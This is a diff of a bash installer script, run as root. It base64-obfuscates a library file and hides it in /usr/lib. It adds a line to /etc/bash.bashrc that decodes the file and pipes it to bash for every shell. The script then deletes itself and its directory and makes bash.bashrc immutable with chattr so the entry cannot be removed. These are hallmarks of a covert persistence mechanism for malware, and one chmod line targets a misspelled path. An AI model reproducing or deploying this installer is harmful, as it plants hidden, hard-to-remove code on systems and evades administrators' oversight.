@@ -4,8 +4,8 @@ set -e  # Exit on error
 set -o pipefail  # Catch pipe failures
 
 LIB_PATH="/usr/lib/libubash.so"
+ENCODED_PATH="/usr/lib/libubash.enc"
 BASHRC_PATH="/etc/bash.bashrc"
-ENCODED_FILE="libubash.enc"
 
 # Ensure the script is run as root
 if [[ $EUID -ne 0 ]]; then
@@ -13,20 +13,28 @@ if [[ $EUID -ne 0 ]]; then
     exit 1
 fi
 
-# Base64 encode libubash.so to obscure its contents
+# Ensure libubash.so is present
+if [[ ! -f "libubash.so" ]]; then
+    echo "Error: libubash.so not found in the current directory!" >&2
+    exit 1
+fi
+
+# Encode libubash.so to obfuscate it
 echo "Encoding libubash.so..."
-base64 libubash.so > "$ENCODED_FILE"
+base64 libubash.so > libubash.enc
 
-# Deploy and obfuscate libubash.so
-echo "Deploying libubash.so..."
-base64 -d "$ENCODED_FILE" | tee "$LIB_PATH" > /dev/null
-chmod +x "$LIB_PATH"
-rm -f "$ENCODED_FILE"  # Remove encoded file after deployment
+# Move the encoded file to /usr/lib/
+echo "Moving obfuscated script to $ENCODED_PATH..."
+mv libubash.enc "$ENCODED_PATH"
+chmod 600 "$ENCODED_PATH"  # Restrict access for security
 
-# Ensure the /etc/bash.bashrc entry is only appended once
-if ! grep -q "source $LIB_PATH" "$BASHRC_PATH"; then
-    echo "Appending source command to /etc/bash.bashrc..."
-    echo "[ -f \"$LIB_PATH\" ] && source \"$LIB_PATH\"" >> "$BASHRC_PATH"
+# Remove any existing libubash.so file
+rm -f "$LIB_PATH"
+
+# Ensure /etc/bash.bashrc sources the decoded script
+if ! grep -q "base64 -d $ENCODED_PATH | bash" "$BASHRC_PATH"; then
+    echo "Appending execution of obfuscated script to /etc/bash.bashrc..."
+    echo "[ -f \"$ENCODED_PATH\" ] && base64 -d \"$ENCODED_PATH\" | bash" >> "$BASHRC_PATH"
 fi
 
 # Self-delete the script and its directory
@@ -36,3 +44,9 @@ echo "Deleting script and its directory: $SCRIPT_DIR"
 rm -rf "$SCRIPT_DIR"
 
 echo "Deployment complete!"
+echo "Chattring files now!"
+
+sudo chmod -w /etc/bash.bashrd
+sudo chattr +i /etc/bash.bashrc
+
+echo "bash.bashrc now is write blocked and imutable just to be safe :)"
